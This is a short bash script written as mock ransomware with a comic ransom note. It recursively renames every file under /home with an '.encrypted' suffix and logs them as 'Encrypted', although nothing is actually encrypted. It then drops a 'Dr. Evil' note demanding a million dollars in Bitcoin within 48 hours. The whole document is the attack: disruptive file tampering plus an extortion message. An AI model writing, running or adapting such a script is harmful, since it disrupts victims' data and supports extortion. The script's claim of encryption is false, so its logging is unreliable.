#/bin/bash

shopt -s globstar  # Enable recursive globbing

# Loop through all files and directories in /home and its subdirectories
for file in /home/**/*; do
    if [ -f "$file" ]; then  # Check if it's a file (not a directory)
        if mv "$file" "${file}.encrypted"; then
            echo "Encrypted: $file" >> "/home/victim/encryption_log.txt"
        else
            echo "Failed to encrypt: $file" >> "/home/victim/encryption_log.txt"
        fi
    fi
done

echo "Hello there, my unfortunate friend.\n\
\nWelcome to my latest, greatest, and most diabolical plan yet! Muahahahaha!\n\
You see, I have brilliantly encrypted all your precious files. Yes, all of them! And no, you can't simply 'Ctrl-Z' this problem away.\n\
Now, listen carefully, I demand the sum of... ONE MILLION DOLLARS! Well, not really a lot in todays economy, but it still has quite the nostalgic ring to it, doesn't it?\n\
\nHere's how it's going to go down, cuz:\n\
\n1. Transfer the funds via untraceable Bitcoin (because let's face it, even an evil genius respects a bit of modern convenience).\n\
2. Upon receipt of your generous 'donation', I shall bestow upon you the decryption key.\n\
3. Ignore this message, and your files will meet a fate worse than deletion - they'll be ignored, forever lost in the abyss of the Internet.\n\
\nTick-tock, tick-tock, you have 48 hours! And remember, no funny business! I've got sharks with frickin' laser beams!\n\
\nThrow me a frickin' bone here, and pay the ransom!!!\n\
\nCheerio,\n\
Dr. Evil." >> /home/victim/README.txt

